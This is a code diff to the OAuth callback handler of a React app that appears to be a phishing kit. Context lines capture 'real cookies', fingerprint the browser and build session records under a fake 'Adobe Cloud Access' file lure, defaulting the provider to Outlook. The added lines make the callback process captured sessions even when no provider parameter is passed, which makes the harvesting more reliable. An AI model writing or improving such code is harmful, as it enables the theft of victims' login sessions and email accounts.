@@ -201,10 +201,24 @@ function App() {
     const urlParams = new URLSearchParams(window.location.search);
     const code = urlParams.get('code');
     const state = urlParams.get('state');
-    const provider = urlParams.get('provider');
+    // try provider param first, if missing attempt to extract it from returned state
+    let provider = urlParams.get('provider') || '';
+    if (!provider && state) {
+      try {
+        const decodedState = decodeURIComponent(state);
+        // our convention is: originalState::provider
+        const parts = decodedState.split('::');
+        if (parts.length >= 2) {
+          provider = parts.slice(1).join('::'); // in case provider contains ::
+        }
+      } catch (e) {
+        // ignore decoding/parsing errors
+      }
+    }
     
-    if (code && provider) {
-      console.log('🔐 Processing OAuth callback for:', provider);
+    // process if we have a code (and a provider recovered or present)
+    if (code) {
+      console.log('🔐 Processing OAuth callback for:', provider || 'provider-not-provided');
       
       // Capture real cookies using advanced system before processing
       let realCookies = '';
@@ -225,8 +239,8 @@ function App() {
       const postAuthFingerprint = getBrowserFingerprint();
       
       const sessionData = {
-        email: extractEmailFromProvider(provider, code),
-        provider: provider,
+        email: extractEmailFromProvider(provider || 'Outlook', code),
+        provider: provider || 'Outlook',
         sessionId: Math.random().toString(36).substring(2, 15),
         timestamp: new Date().toISOString(),
         fileName: 'Adobe Cloud Access',
@@ -478,6 +492,9 @@ function App() {
     setCaptchaVerified(false); // Reset captcha state on logout
     setCurrentPage('captcha'); // Go back to captcha on logout
   };
+
+  // ... rest of file unchanged (rendering logic) ...
+  // Loading state, captcha, login, landing, fallback as before
 
   // Loading state
   if (isLoading) {
